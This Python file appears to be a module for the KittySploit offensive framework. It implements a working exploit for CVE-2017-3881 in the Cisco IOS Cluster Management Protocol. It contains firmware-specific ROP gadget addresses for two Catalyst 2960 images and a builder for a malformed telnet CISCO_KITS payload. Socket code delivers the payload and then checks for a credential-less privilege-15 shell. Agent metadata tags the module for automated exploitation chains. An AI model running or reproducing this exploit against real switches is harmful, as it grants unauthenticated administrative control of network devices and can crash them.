#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CVE-2017-3881 — Cisco IOS / IOS XE Cluster Management Protocol (CMP) telnet RCE.

Patches in-memory function pointers so subsequent telnet sessions receive a
credential-less privilege-15 shell. Firmware-specific ROP gadgets from Artem
Kondratenko's PoC (artkond/cisco-rce).
"""

from __future__ import annotations

import socket
from typing import Dict, Optional, Tuple

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client, _get_opt

# Shared first gadget (both supported C2960 LANBASEK9-M images)
_GADGET1 = b"\x00\x00\x37\xb4"

_FIRMWARE_PROFILES: Dict[str, Dict[str, bytes]] = {
    "c2960_12.2.55.se1": {
        "label": "C2960 LANBASEK9-M 12.2(55)SE1",
        "is_cluster_mode_ptr": b"\x02\x2c\x8b\x74",
        "set_cluster_true": b"\x00\x00\x99\x80",
        "unset_cluster_true": b"\x00\x04\xea\x58",
        "gadget2": b"\x00\xdf\xfb\xe8",
        "gadget3": b"\x00\x06\x78\x8c",
        "r1_plus8_g3": b"\x02\x2c\x8b\x60",
        "gadget4": b"\x00\x6b\xa1\x28",
        "set_priv15": b"\x00\x12\x52\x1c",
        "unset_priv15": b"\x00\x04\xe6\xf0",
        "gadget5": b"\x01\x48\xe5\x60",
        "return_addr": b"\x01\x13\x31\xa8",
    },
    "c2960_12.2.55.se11": {
        "label": "C2960 LANBASEK9-M 12.2(55)SE11",
        "is_cluster_mode_ptr": b"\x02\x3d\x55\xdc",
        "set_cluster_true": b"\x00\x00\x99\x9c",
        "unset_cluster_true": b"\x00\x04\xea\xe0",
        "gadget2": b"\x00\xe1\xa9\xf4",
        "gadget3": b"\x00\x06\x7b\x5c",
        "r1_plus8_g3": b"\x02\x3d\x55\xc8",
        "gadget4": b"\x00\x6c\xb3\xa0",
        "set_priv15": b"\x00\x27\x0b\x94",
        "unset_priv15": b"\x00\x04\xe7\x78",
        "gadget5": b"\x01\x4a\xcf\x98",
        "return_addr": b"\x01\x14\xe7\xec",
    },
}


def _build_cmp_payload(profile: Dict[str, bytes], set_credless: bool) -> bytes:
    """Build the malformed CISCO_KITS telnet subnegotiation ROP chain."""
    payload = b"\xff\xfa\x24\x00"
    payload += b"\x03CISCO_KITS\x012:"
    payload += b"A" * 116
    payload += _GADGET1
    payload += profile["is_cluster_mode_ptr"]
    payload += profile["set_cluster_true"] if set_credless else profile["unset_cluster_true"]
    payload += b"BBBB"
    payload += profile["gadget2"]
    payload += b"CCCC"
    payload += b"DDDD"
    payload += b"EEEE"
    payload += profile["gadget3"]
    payload += profile["r1_plus8_g3"]
    payload += b"FFFF"
    payload += b"GGGG"
    payload += profile["gadget4"]
    payload += profile["set_priv15"] if set_credless else profile["unset_priv15"]
    payload += b"HHHH"
    payload += b"IIII"
    payload += profile["gadget5"]
    payload += b"JJJJ"
    payload += b"KKKK"
    payload += b"LLLL"
    payload += profile["return_addr"]
    payload += b":15:" + b"\xff\xf0"
    return payload


class Module(Auxiliary, Tcp_scanner_client):
    __info__ = {
        "name": "Cisco IOS CMP CVE-2017-3881 credless privilege-15 telnet",
        "description": (
            "CVE-2017-3881: sends malformed Cluster Management Protocol (CMP) "
            "telnet options (CISCO_KITS) to patch in-memory authentication hooks "
            "and grant unauthenticated privilege-15 CLI on the next telnet session. "
            "ROP gadgets are firmware-specific; wrong image may crash the device."
        ),
        "author": [
            "Artem Kondratenko (@artkond)",
            "KittySploit Team",
        ],
        "cve": ["CVE-2017-3881"],
        "references": [
            "https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/",
            "https://github.com/artkond/cisco-rce",
            "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp",
            "https://nvd.nist.gov/vuln/detail/CVE-2017-3881",
        ],
        "tags": [
            "cisco",
            "ios",
            "ios-xe",
            "catalyst",
            "telnet",
            "cmp",
            "cluster",
            "privesc",
            "unauthenticated",
            "cve-2017-3881",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "credential_access"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.5,
            "noise": 0.6,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["cisco", "ios", "catalyst", "telnet"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_access", "from_detail": "ios_credless_telnet"},
                    {"capability": "network_device", "from_detail": ""},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(23, "Target Telnet port", required=True)
    firmware = OptChoice(
        "c2960_12.2.55.se1",
        "IOS image profile (ROP gadgets must match running firmware)",
        required=True,
        choices=list(_FIRMWARE_PROFILES.keys()),
    )
    action = OptChoice(
        "set",
        "Patch credless privilege-15 authentication (set) or restore (unset)",
        required=True,
        choices=["set", "unset"],
    )
    verify = OptBool(
        True,
        "After --set, open a second telnet session and look for an immediate # prompt",
        required=False,
    )
    verbose = OptBool(False, "Print telnet banner bytes", required=False, advanced=True)

    def _opt(self, option) -> str:
        if hasattr(option, "value"):
            return str(option.value or "").strip()
        return str(option or "").strip()

    def _timeout_sec(self) -> float:
        return max(float(_get_opt(self, "timeout") or 10), 5.0)

    def _profile(self) -> Tuple[str, Dict[str, bytes]]:
        key = self._opt(self.firmware) or "c2960_12.2.55.se1"
        if key not in _FIRMWARE_PROFILES:
            key = "c2960_12.2.55.se1"
        return key, _FIRMWARE_PROFILES[key]

    def _probe_banner(self, host: str, port: int) -> Tuple[bool, str]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(self._timeout_sec())
            sock.connect((host, port))
            data = sock.recv(1024)
            banner = data.decode("utf-8", errors="replace")
            lowered = banner.lower()
            hints = ("cisco", "ios", "catalyst", "switch")
            return any(h in lowered for h in hints), banner
        except Exception as exc:
            return False, str(exc)
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _send_cmp_payload(
        self,
        host: str,
        port: int,
        profile: Dict[str, bytes],
        set_credless: bool,
    ) -> Tuple[bool, str]:
        payload = _build_cmp_payload(profile, set_credless=set_credless)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(self._timeout_sec())
            sock.connect((host, port))
            banner = sock.recv(1024)
            if bool(self.verbose):
                print_info(f"Telnet banner: {repr(banner)}")
            sock.sendall(payload)
            return True, banner.decode("utf-8", errors="replace")
        except Exception as exc:
            return False, str(exc)
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _verify_credless_shell(self, host: str, port: int) -> Tuple[bool, str]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(self._timeout_sec())
            sock.connect((host, port))
            _ = sock.recv(1024)
            sock.sendall(b"\r\n")
            response = sock.recv(4096)
            text = response.decode("utf-8", errors="replace")
            lowered = text.lower()
            if "username" in lowered or "password" in lowered:
                return False, text
            if "#" in text:
                return True, text
            return False, text
        except Exception as exc:
            return False, str(exc)
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def check(self):
        host = self._host()
        port = self._port()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        if not self.is_tcp_open(host=host, port=port):
            return {
                "vulnerable": False,
                "reason": f"TCP {port} closed on {host}",
                "confidence": "high",
            }
        cisco_like, banner = self._probe_banner(host, port)
        if cisco_like:
            return {
                "vulnerable": True,
                "reason": "Telnet open with Cisco IOS banner — CMP exploit may apply if unpatched",
                "confidence": "medium",
                "banner": banner[:200],
            }
        return {
            "vulnerable": True,
            "reason": "Telnet port open; firmware/CMP exposure not confirmed from banner",
            "confidence": "low",
            "banner": banner[:200],
        }

    def run(self):
        host = self._host()
        port = self._port()
        if not host:
            print_error("Target host is required")
            return False

        profile_key, profile = self._profile()
        set_credless = self._opt(self.action) != "unset"
        label = profile.get("label", profile_key)

        print_status(f"Target: {host}:{port}")
        print_status(f"Firmware profile: {label}")
        print_status(
            "Setting credless privilege-15 authentication"
            if set_credless
            else "Unsetting credless privilege-15 authentication"
        )
        print_warning(
            "Wrong firmware profile can reload or crash the switch — lab use only"
        )

        if not self.is_tcp_open(host=host, port=port):
            print_error(f"Telnet port {host}:{port} is not reachable")
            return False

        ok, detail = self._send_cmp_payload(
            host,
            port,
            profile,
            set_credless=set_credless,
        )
        if not ok:
            print_error(f"CMP payload delivery failed: {detail}")
            return False

        print_success("CMP payload sent")

        if set_credless and bool(self.verify):
            print_status("Verifying credless privilege-15 shell on a new telnet session")
            verified, verify_text = self._verify_credless_shell(host, port)
            if bool(self.verbose) and verify_text:
                print_info(verify_text[:2000])
            if verified:
                print_success("Immediate enable (#) prompt observed — credless priv-15 likely active")
            else:
                print_warning(
                    "Verification inconclusive (wrong firmware profile, already patched, "
                    "or telnet requires authentication)"
                )
                return False

        if set_credless:
            print_success("Credless privilege-15 telnet access should be available")
            print_info(f"Connect: telnet {host} {port}")
            print_info("Then run: show privilege  (expect level 15)")
        else:
            print_success("Credless authentication patch reverted (unset)")
        return True
